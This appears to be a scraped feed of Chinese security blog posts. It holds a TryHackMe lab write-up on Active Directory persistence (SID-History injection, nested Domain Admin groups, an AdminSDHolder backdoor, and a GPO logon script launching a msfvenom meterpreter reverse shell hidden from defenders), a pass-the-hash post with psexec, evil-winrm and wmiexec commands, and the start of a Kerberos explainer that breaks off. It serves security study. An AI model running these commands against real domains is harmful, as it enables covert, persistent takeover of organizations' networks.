SID，因为这是我们要添加到 SID 历史记录的组：</p><ol><li>获取域控管理员账户的SID-History</li></ol><p><img src="../images/image-20230925102604847.png" alt="image-20230925102604847"></p><p>这里的话我们就可以成功获取这个域控管理员的SID了</p><ol><li>添加SID-History</li></ol><p><strong>我们可以使用类似Mimikatz的东西来添加SID历史记录。但是，最新版本的Mimikatz有一个缺陷，不允许它修补LSASS以更新SID历史记录。</strong>因此，我们需要使用其他东西。在这种情况下，我们将使用 DSInternals 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库：</p><p><img src="../images/image-20230925103039639.png" alt="image-20230925103039639"></p><blockquote><p>PS C:\Users\Administrator.ZA&gt; Import-Moduls DSInternals</p><p>PS C:\Users\Administrator.ZA&gt;Stop-Service -Name ntds -force  </p><p>PS C:\Users\Administrator.ZA&gt; Add-ADDBSidHistory -SamAccountName ‘username of our low-priveleged AD account’ -SidHistory ‘SID to add to SID History’ -DatabasePath C:\Windows\NTDS\ntds.dit  </p><p>PS C:\Users\Administrator.ZA&gt;Start-Service -Name ntds </p></blockquote><p>这里靶场不知道抽啥风了  报错没成功  反正就是按照上面三步走就行了  </p><p>还有一点就是  如果使用<code>mimikatz</code>的话也是可以的  但是要注意版本  有些版本是不行的  会报错</p><p><img src="../images/image-20230925104200242.png" alt="image-20230925104200242"></p><p>就是会爆出这个错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将高权限的 SID History 属性注入</span><br><span class="line">privilege::debug</span><br><span class="line"># 注入SID之前需要使用以下命令修复NTDS服务，否则无法将高权限的SID注人低权限用户的SID History属性;</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:tester /new:administrator</span><br><span class="line"></span><br><span class="line"># 查看 tester 用户的 SID History 属性</span><br><span class="line">Get-ADUser tester -Properties sidhistory</span><br><span class="line"></span><br><span class="line"># 清除恶意用户的 SID History 属性</span><br><span class="line">sid::clear /sam:username</span><br></pre></td></tr></table></figure><p>mimikatz有些版本就会支持这样做</p><h2 id="通过组成员身份实现持久性"><a href="#通过组成员身份实现持久性" class="headerlink" title="通过组成员身份实现持久性"></a>通过组成员身份实现持久性</h2><p>如果我们不想篡改 SID 历史记录，<strong>可以直接将自己添加到 AD 组中以实现持久性</strong>。虽然 SID 历史记录是一种很好的持久性技术，但凭据轮换和清理仍然可以删除持久性。在某些情况下，最好通过以 AD 组本身为目标来执行持久性。</p><h3 id="通过组成员身份实现持久性-1"><a href="#通过组成员身份实现持久性-1" class="headerlink" title="通过组成员身份实现持久性"></a>通过组成员身份实现持久性</h3><p>特权最高的帐户或组并不总是最适合用于持久性。特权组比其他组更密切地监视更改。任何归类为受保护组的组（如域管理员或企业管理员）都会受到额外的安全审查。因此，如果我们想通过组成员身份坚持下去，我们可能需要在将自己的帐户添加到的组上发挥创意，以实现持久性：</p><h3 id="嵌套组"><a href="#嵌套组" class="headerlink" title="嵌套组"></a>嵌套组</h3><p>这个组才是这里的关键  等会就是使用这个组来进行持久化</p><blockquote><p>在大多数组织中，有大量的递归组。递归组是作为另一个组成员的组。我们可以将其视为群体嵌套。组嵌套用于在 AD 中创建更有条理的结构。以 IT 支持组为例。IT 支持非常通用。因此，也许此组下有帮助台、访问卡管理器和网络管理员等子组。我们可以将所有这些组作为成员添加到 IT 支持组，从而为这些子组中的所有用户提供与 IT 支持组关联的权限和特权，但随后我们可以为每个子组分配更精细的权限和特权。</p></blockquote><p>虽然组嵌套有助于组织 AD，但它确实降低了有效访问的可见性。再次以我们的 IT 支持为例。如果我们向 AD 查询 IT 支持组的成员身份，它将以 3 计数进行响应。但是，这个计数并不真实，因为它是三组。为了了解有效访问，我们现在还必须枚举这些子组。但这些子组也可以有子组。所以问题变成了：“我们应该枚举多少层才能获得真正的有效访问号码？</p><p>这也成为一个监控问题。例如，假设我们有一个警报，当将新成员添加到域管理员组时，该警报会触发。这是一个很好的警报，但如果将用户添加到域管理员组中的子组，则不会触发。这是一个非常常见的问题，因为 AD 由 AD 团队管理，警报和监视由 InfoSec 团队管理。我们所需要的只是一点点沟通不畅，并且警报不再有效，因为使用了子组。</p><p>作为攻击者，我们可以利用这种降低的可见性来执行持久性。我们没有针对为我们提供环境访问权限的特权群体，而是将注意力集中在子群体上。我们不会将自己添加到会引发警报的特权组中，而是将自己添加到未受监视的子组中。</p><p><strong>上面就是为什么要用这个嵌套组的原因了</strong></p><h3 id="利用嵌套组"><a href="#利用嵌套组" class="headerlink" title="利用嵌套组"></a>利用嵌套组</h3><p>让我们模拟这种类型的持久性。为了允许其他用户也执行该技术，请确保在你创建的所有组前面加上您的用户名。为了模拟持久性，我们将创建一些自己的组。让我们首先创建一个新的基本组，我们将隐藏在人员&gt;IT 组织单位 （OU） 中：</p><ol><li>第一步</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path &quot;OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 1&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup1&quot; -DisplayName &quot;&lt;username&gt; Nest Group 1&quot; -GroupScope Global -GroupCategory Security</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230925112142504.png" alt="image-20230925112142504"></p><ol><li>第二步</li></ol><p>现在，让我们在人员&gt;销售 OU 中创建另一个组，并将我们以前的组添加为成员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path &quot;OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 2&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup2&quot; -DisplayName &quot;&lt;username&gt; Nest Group 2&quot; -GroupScope Global -GroupCategory Security </span><br><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup2&quot; -Members &quot;&lt;username&gt;_nestgroup1&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230925112326892.png" alt="image-20230925112326892"></p><ol><li>第三步</li></ol><p>我们可以再这样做几次，每次将前一个组添加为成员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 3&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup3&quot; -DisplayName &quot;&lt;username&gt; Nest Group 3&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup3&quot; -Members &quot;&lt;username&gt;_nestgroup2&quot;</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 4&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup4&quot; -DisplayName &quot;&lt;username&gt; Nest Group 4&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup4&quot; -Members &quot;&lt;username&gt;_nestgroup3&quot;</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 5&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup5&quot; -DisplayName &quot;&lt;username&gt; Nest Group 5&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup5&quot; -Members &quot;&lt;username&gt;_nestgroup4&quot;</span><br></pre></td></tr></table></figure><p>对于最后一个组，现在让我们将该组添加到域管理员组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;&lt;username&gt;_nestgroup5&quot;</span><br></pre></td></tr></table></figure><p>最后，让我们将低特权 AD 用户添加到我们创建的第一个组中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup1&quot; -Members &quot;&lt;low privileged username&gt;&quot;</span><br></pre></td></tr></table></figure><blockquote><p>最后生成的嵌套组的样子</p><p>IT——&gt;OU</p><p>​    第五组—————(IT组)</p><p>​        第四组</p><p>​            第三组</p><p>​                第二组</p><p>​                    第一组————(IT组)</p><p>就是这样的嵌套模式   其他组是啥就无所谓了</p></blockquote><p>然后我们ssh—-登录低权限用户</p><p>执行<code>dir \\thmdc.za.tryhackme.loc\c$\</code> </p><p><img src="../images/image-20230925113415104.png" alt="image-20230925113415104"></p><p>我们还要验证一下，即使我们创建了多个组，域管理员组也只有一个新成员：</p><p><img src="../images/image-20230925113530594.png" alt="image-20230925113530594"></p><h3 id="危害性"><a href="#危害性" class="headerlink" title="危害性"></a>危害性</h3><p>如果这是一个真正的组织，我们就不会创建新的团体来嵌套。相反，我们将利用现有组来执行嵌套。然而，这是你在正常的红队评估中永远不会做的事情，而且几乎总是在这一点上脱链，因为它破坏了组织的AD结构，如果我们充分打破它，他们将无法恢复。在这一点上，即使蓝队能够把我们踢出去，该组织很可能仍然必须从头开始重建他们的整个AD结构，从而导致重大损失。</p><p><strong>就是证书伪造一样  危害性比较大  在正常的红队评估里面是不太会用到的  因为可能回导致整个域的重组</strong>  </p><h2 id="通过-ACL-实现持久性"><a href="#通过-ACL-实现持久性" class="headerlink" title="通过 ACL 实现持久性"></a>通过 ACL 实现持久性</h2><h3 id="通过-AD-组模板持久化"><a href="#通过-AD-组模板持久化" class="headerlink" title="通过 AD 组模板持久化"></a>通过 AD 组模板持久化</h3><p>上面的嵌套组的话有个缺点就是会被蓝队发现并删除  但是如果我们注入到生成默认组的模板中。通过注入这些模板，即使它们删除了我们的会员资格，我们只需要等到模板刷新，我们将再次被授予会员资格。</p><p><strong>(这就和注入嵌套组不一样了  因为这里的话即使组被删除了  等模板刷新  我们的组还是会重新生成)</strong></p><p>一个这样的模板是 AdminSDHolder 容器。此容器存在于每个 AD 域中，其访问控制列表 （ACL） 用作模板，用于将权限复制到所有受保护组。受保护组包括特权组，例如域管理员、管理员、企业管理员和架构管理员</p><p>一个名为 SDProp 的进程获取 AdminSDHolder 容器的 ACL，并每 60 分钟将其应用于所有受保护组。<strong>因此，我们可以编写一个 ACE，该 ACE 将授予我们对所有受保护组的完全权限   (这里的意思就是我们可以随意更改这些保护组  或者执行其他操作)</strong>。如果蓝队不知道正在使用这种类型的持久性，那将是相当令人沮丧的。每次他们删除对受保护对象或组的不当权限时，该权限都会在一小时内重新出现。由于此重建是通过正常的AD过程进行的，因此它也不会向蓝队显示任何警报，因此更难查明持久性的来源。</p><h3 id="利用-AdminSDHolder"><a href="#利用-AdminSDHolder" class="headerlink" title="利用 AdminSDHolder"></a>利用 AdminSDHolder</h3><p>这里登录先登录一个低权限用户   不用直接登录域控主机  因为rdp的话会把域控管理员踢出会话</p><p>登录之后再使用 <code>runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe</code>  将域控管理员凭证进行注入</p><p>然后我们就拥有域控管理员权限了  然后在执行MMC  </p><p><img src="../images/image-20230926105621585.png" alt="image-20230926105621585"></p><p>然后在模板处  将我们这个低权限用户假如到该模板中</p><p><img src="../images/image-20230926105710849.png" alt="image-20230926105710849"></p><p>现在我们只需要等待 60 分钟，我们的用户就可以完全控制所有受保护组。这是因为<strong>安全描述符传播器 （SDProp） 服务</strong>每 60 分钟自动执行一次，并将此更改传播到所有受保护组</p><p><strong>(也可以将自己添加到域控管理员中)</strong></p><h2 id="通过-GPO-实现持久性"><a href="#通过-GPO-实现持久性" class="headerlink" title="通过 GPO 实现持久性"></a>通过 GPO 实现持久性</h2><h3 id="域范围的持久性"><a href="#域范围的持久性" class="headerlink" title="域范围的持久性"></a>域范围的持久性</h3><p>以下是一些常见的 GPO 持久性技术：</p><ul><li>受限组成员身份 - 这可能允许我们对域中的所有主机进行管理访问</li></ul><p><strong>（因为受限组成员就是只能执行某些权限  相当于委派一样  如果我们拿下域控的话  我们就可以给这些组用户一些高级权限来访问其他主机)</strong></p><ul><li>登录脚本部署 - 这将确保每次用户向域中的主机进行身份验证时，我们都会收到 shell 回调。</li></ul><h3 id="利用GPO"><a href="#利用GPO" class="headerlink" title="利用GPO"></a>利用GPO</h3><p>在我们创建之前  先使用<code>msfvenom</code>来生成这个exe和bat文件  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe &gt; &lt;username&gt;_shell.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//bat文件</span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line">rem </span><br><span class="line">rem </span><br><span class="line">asd_shell.exe</span><br><span class="line"></span><br><span class="line">rem </span><br><span class="line"></span><br><span class="line">//这个exe文件要和这个bat文件在一个m</span><br></pre></td></tr></table></figure><p>Windows允许我们通过登录GPO执行Batch或PowerShell脚本。批处理脚本通常比 PowerShell 脚本更稳定，因此让我们创建一个将可执行文件复制到主机并在用户进行身份验证后执行它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用scp将在自己服务器上生成的文件上传到这个windows主机上</p><p>然后打开监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit&quot;</span><br></pre></td></tr></table></figure><h3 id="配置GPO"><a href="#配置GPO" class="headerlink" title="配置GPO"></a>配置GPO</h3><p>上面该生成的文件已经生成完了  我们现在就是配置GPO策略  来使某些用户登录时自动执行我们构造的恶意脚本</p><p><img src="../images/image-20230926143329084.png" alt="image-20230926143329084"></p><p><img src="../images/image-20230926143533350.png" alt="image-20230926143533350"></p><p><strong>这个目录就是专门存放这些脚本的</strong></p><ol><li>rdp登录域控主机后 </li></ol><p>执行<code>mmc</code>命令  然后添加组策略管理”管理单元“</p><p><img src="../images/62aab3368a951e8180c35bef9ed82ead.png" alt="img"></p><p>然后选择Admins这个OU   添加组策略 </p><p><img src="../images/e71058947046aa9b8e77dff06292d15b.png" alt="img"></p><p>右键单击您的策略，然后选择“已强制”。这将确保您的策略将适用，即使存在冲突的策略。这有助于确保我们的 GPO 优先，即使蓝队编写了将删除我们更改的策略。</p><p>让我们回到组策略管理编辑器：</p><ul><li>在“用户配置”下，展开“策略-&gt;Windows 设置”。</li><li>选择“脚本（登录/注销）”。</li><li>右键单击登录&gt;属性</li><li>选择“脚本”选项卡。</li><li>单击“添加&gt;浏览”。</li></ul><p><img src="../images/c74b252805561488167c1a7c5d02dcce.png" alt="GPO edit"></p><p>选择批处理文件作为脚本，然后单击“打开”和“确定”。 单击“应用”和“确定”。</p><p>那么现在这些OU里面的管理员用户只要一登录  脚本就会自动执行  我们这边就会监听到shell</p><h3 id="隐藏GPO"><a href="#隐藏GPO" class="headerlink" title="隐藏GPO"></a>隐藏GPO</h3><p><strong>我们虽然这样做了  但是为了不让蓝队轻易的发现我们设置的GPO  我们还得进行隐藏</strong></p><p>返回到 MMC 窗口，单击策略，然后单击“委派”：</p><p><img src="../images/744c4e6a1dd0a5aef63680cc7cf53120.png" alt="img"></p><p>默认情况下，所有管理员都可以编辑 GPO。让我们删除这些权限：</p><ul><li>右键单击“企业域控制器”，然后选择“编辑设置、删除、修改安全性”。</li><li>单击所有其他组（经过身份验证的用户除外），然后单击删除。</li></ul><p>然后就留下这些委派就行了</p><p><img src="../images/79f5e69b102214a73b605ed86e67aa7d.png" alt="img"></p><p>单击高级并从权限中删除创建的所有者：</p><p><img src="../images/cb338537225085db379e8f5fecf82684.png" alt="GPO edit"></p><p>默认情况下，所有经过身份验证的用户都必须能够读取策略。这是必需的，因为否则，当用户进行身份验证以应用用户策略时，用户帐户无法读取策略，那么就无法执行我们的脚本了</p><p>我们可以将“经过身份验证的用户”替换为“域计算机”，以确保计算机仍可以读取和应用策略，但阻止任何用户读取策略。</p><p><strong>(这样的话就只有计算机的管理员用户能够读取了  我们使用用户登录的话就不能进行读取了)</strong></p><ul><li>单击添加。</li><li>键入“域计算机”，单击“检查名称”，然后单击“确定”。</li><li>选择读取权限，然后单击确定。</li><li>单击经过身份验证的用户，然后单击删除。</li></ul><p><img src="../images/c960f0e9443e92abe52a4993e7ad1287.png" alt="img"></p><p>这样的话我们就不能读取这个GPO策略了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的使用这个的前提就是已经拿下域控了  并且拿下管理员账户了&lt;/p&gt;
&lt;p&gt;为了防止蓝队把我们踢出局  所以执行这个是必要的&lt;/p&gt;
&lt;h2 id=&quot;DC-Sync&quot;&gt;&lt;a href=&quot;#DC-Sync&quot; class=&quot;headerlink&quot; title=&quot;DC Sync</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows-NTLM与PTH</title>
    <link href="https://ke1nys.github.io/posts/4c70f180.html"/>
    <id>https://ke1nys.github.io/posts/4c70f180.html</id>
    <published>2023-09-16T11:22:08.000Z</published>
    <updated>2023-09-16T13:53:03.394Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章也是在打春秋云镜Time靶机的时候遇到这个东西  于是就想写篇文章来记录学习一下  thm虽然也讲了  但是自己写一遍记录的话还是能够加深印象的</p><h2 id="NTLM-身份验证原理"><a href="#NTLM-身份验证原理" class="headerlink" title="NTLM 身份验证原理"></a>NTLM 身份验证原理</h2><p>这个NTLM协议和Kerberos就是域中身份验证的两大协议  </p><p><img src="../images/9434c96e1bc0519f8d851b44d85b6702-16948638146502.png" alt="NTLM authentication"></p><p>这个NTLM协议相比于Kerberos协议是稍微简陋了一点  所以这就是为什么Kerberos协议是主流的原因</p><ol><li>客户端向要访问的服务器发送身份验证请求。</li><li>服务器生成一个随机数，并将其作为质询发送给客户端。</li><li>客户端将其 NTLM 密码哈希与质询（和其他已知数据）相结合，以生成对质询的响应，并将其发送回服务器进行验证。</li><li>服务器将质询和响应转发到域控制器进行验证。</li><li>域控制器使用质询重新计算响应，并将其与客户端发送的初始响应进行比较。如果它们都匹配，则客户端进行身份验证;否则，访问将被拒绝。身份验证结果将发送回服务器。</li><li>服务器将身份验证结果转发到客户端</li></ol><p>就是这么个身份验证原理</p><p><strong>(那么这个协议使用少的话肯定是有他自己的原因的  接下来就讲一下这个PTH攻击  就是因为这个协议的验证过于简陋造成的)</strong></p><h2 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h2><p>由于从我们已获得管理权限的主机中提取凭据（通过使用 mimikatz 或类似工具），我们可能会获得易于破解的明文密码或哈希。但是，如果我们不够幸运，我们最终会得到<strong>未破解的 NTLM 密码哈希</strong>。</p><p>尽管我们似乎无法真正使用这些哈希，但只需知道密码哈希即可响应身份验证期间发送的 NTLM 质询。这意味着我们可以进行身份验证，而无需知道明文密码。如果将 Windows 域配置为使用 NTLM 身份验证，则不必破解 NTLM 哈希，我们可以传递哈希 （PtH） 并成功进行身份验证。</p><p>要提取 NTLM 哈希，我们可以使用 mimikatz 读取<strong>本地 SAM</strong> 或直接从 <strong>LSASS 内存</strong>中提取哈希。</p><ul><li><strong>本地SAM进行读取</strong></li></ul><p>这个的话是只能读取这个计算下用户的hash值  并不能提取到别的</p><blockquote><p>lsadump::sam  </p></blockquote><ul><li><strong>LSASS 内存进行读取</strong></li></ul><p>这个的话是可以提取本地用户和最近登录到计算机的任何域用户的任何 NTLM 哈希</p><blockquote><p>sekurlsa::msv </p></blockquote><p>那么我们只需要获取到这个NTLM哈希后  我们就可以开始进行PTH攻击了</p><h3 id="PTH连接RDP"><a href="#PTH连接RDP" class="headerlink" title="PTH连接RDP"></a>PTH连接RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH</span><br></pre></td></tr></table></figure><h3 id="PTH-通过-psexec-连接"><a href="#PTH-通过-psexec-连接" class="headerlink" title="PTH 通过 psexec 连接"></a>PTH 通过 psexec 连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP</span><br><span class="line"></span><br><span class="line">知道账号密码的话</span><br><span class="line">proxychains psexec.py xiaorang.lab/Hacker:&#x27;Hacker123!&#x27;@WIN2019.xiaorang.lab -dc-ip 172.22.6.12</span><br><span class="line"></span><br><span class="line">//xiaorang.lab--域名</span><br><span class="line">//Hacker:&#x27;Hacker123!&#x27;--账号密码</span><br><span class="line">//WIN2019主机名</span><br><span class="line">//xiaorang.lab--域名</span><br><span class="line">//172.22.6.12--主机ip--也是域控ip</span><br></pre></td></tr></table></figure><p><strong>(必须在linux环境下进行连接)</strong></p><p>psexec的话都是直接连接到这个windows终端  </p><p><strong>这个psexec的使用条件是有点苛刻的</strong></p><ul><li>对方主机开启了 admin共享，如果关闭了admin共享，会提示：找不到网络名</li><li>如果是工作组环境，则必须使用administrator用户连接，使用普通用户连接会提示：登录失败: 未授予用户在此计算机上的请求登录类型。</li><li>如果是域环境，连接普通域主机可以用普通域用户，连接域控需要域管理员。</li><li>这里用非域管，就提示登录失败</li></ul><p><strong>如何判断是组还是域</strong></p><blockquote><ul><li>wmic computersystem get domain：如果返回结果是一个域名，那么系统处于域环境。</li><li>wmic computersystem get workgroup：如果返回结果是一个工作组名称，那么系统处于工作组环境。</li></ul></blockquote><h3 id="PTH连接WinRM"><a href="#PTH连接WinRM" class="headerlink" title="PTH连接WinRM"></a>PTH连接WinRM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</span><br></pre></td></tr></table></figure><p>这个的话也是连接到这个windows终端</p><p><strong>使用WIM也是可以的</strong>    只不过这个的话是需要密码明文的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec  XIAORANG/administrator@172.22.6.12   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</span><br><span class="line"></span><br><span class="line">//XIAORANG ---域名</span><br><span class="line">//administrator--域管理员</span><br><span class="line">//172.22.6.12--windows主机--也是域控主机</span><br><span class="line">//获得的hash值</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章也是在打春秋云镜Time靶机的时候遇到这个东西  于是就想写篇文章来记录学习一下  thm虽然也讲了  但是自己写一遍记录的话还是能够加深印象的&lt;/p&gt;
&lt;h2 id=&quot;NTLM-身份验证原理&quot;&gt;&lt;a href=&quot;#NTLM-身份验证原理&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows域-Kerberos协议</title>
    <link href="https://ke1nys.github.io/posts/1bedf17b.html"/>
    <id>https://ke1nys.github.io/posts/1bedf17b.html</id>
    <published>2023-09-15T07:05:59.000Z</published>
    <updated>2023-09-30T09:21:49.057Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话其实是在thm简单的了解和查看了一遍  然后在打靶机的时候又遇到了 所以就自己写一下  加深印象</p><p><a href="https://jtz.notion.site/Kerberos-60eca8e8fa294275a7ae5cff4b893e90">参考文章</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Kerberos 是一种网络认证协议, 其设计目标是通过密钥系统为 客户机 服务器 应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥) 执行认证服务的</p><p><strong>其实也是两大AD域身份验证协议之一  另一个是NTLM协议  (微软专用)</strong></p><p><strong>这个协议默认是88端口</strong></p><h2 id="参与对象"><a href="#参与对象" class="headerlink" title="参与对象"></a>参与对象</h2><ol><li>KDC : KDC是负责Kerberos协议的主要服务。该服务在域控制器服务器上运行。它包含 Active Directory 环境中所有客户端和服务帐户的信息和密码哈希。这些密码哈希值在 Kerberos 协议期间用作共享密钥<ol><li>Authentication Service (AS) : 它是密钥分发中心中负责认证步骤的模块。该模块通过检查客户端是否在Active Directory域（Domain）、提供的密码是否正确等信息来对客户端进行身份验证</li><li>Ticket Granting Service (TGS): 该模块为经过身份验证的客户端提供必要票证的创建、验证和管理</li><li>KRBTGT : 它是提供密钥分发中心服务管理的用户帐户。该用户的密码哈希用于加密某些票证</li></ol></li><li>客户端 : 发起认证以访问服务的对象, 可以时用户账号也可以是机器账号, 在 AD 中每个用户和计算机都有一个账号, 其中用户账号是使用用户名创建的, 而计算机账号是使用 <code>计算机名+$</code> 表示的, 计算机账号和用户账号一样都有密码这些密码每30天重新生成一次</li><li>服务端 : 客户端想要访问的服务, 管理这些服务的用户、计算机对象也被称为服务账号</li><li>Account Database : 存储所有客户端的白名单 , <strong>只有存在于白名单的客户才能申请 TGT</strong></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>TGT</li></ul><p>TGT的申请条件就是必须是域用户  并且申请的时候密码也必须正确</p><ul><li>TGS</li></ul><p>这个的话是通过TGT身份验证通过后 想要在访问什么服务的时候才会去申请来创建对应的票据</p><h2 id="简单认证流程"><a href="#简单认证流程" class="headerlink" title="简单认证流程"></a>简单认证流程</h2><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F623a54a7-927e-4a9d-b24d-74fbc0166230%2FUntitled.png" alt="img"></p><h3 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h3><p>用户将 用户名&amp;密码派生的密钥加密的时间戳 发送的密钥分发中心 (KDC), 该服务通常安装在负责在网络上创建 Kerberos 票证的域控制器上, 当验证通过后, KDC 将创建发回票证授予票证(TGT) , 这将允许用户请求额外的票证以访问特定的服务, 需要一张票才能获得更多的票可能听起来有点奇怪，但它允许用户在每次想要连接到服务时无需传递其凭据即可请求服务票。与TGT一起的还有一个 TGS_Session_KEY 被提供给用户，我们需要基于此来获取更多的内容</p><p><strong>TGT 是使用 krbtgt 帐户的密码哈希加密的，因此用户无法访问其内容。同时加密的TGT包括 TGS_Session_Key 的副本作为其内容的一部分，并且 KDC 无需存储会话密钥，因为它可以在需要时通过解密 TGT 来恢复副本</strong></p><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe8ea9662-b45d-4e4f-80c3-587e91b3a812%2FUntitled.png" alt="img"></p><ul><li><strong>Session_key是啥</strong></li></ul><p><img src="../images/image-20230915153036447.png" alt="image-20230915153036447"></p><ul><li><strong>TGT中包含了啥</strong></li></ul><p>TGT票据中包含的是与用户相关的身份信息，例如用户名、颁发票据的时间戳、票据的有效期等。此外，<strong>TGT票据还包含了Session Key，该密钥用于后续的票据交换和加密通信。</strong></p><h3 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; 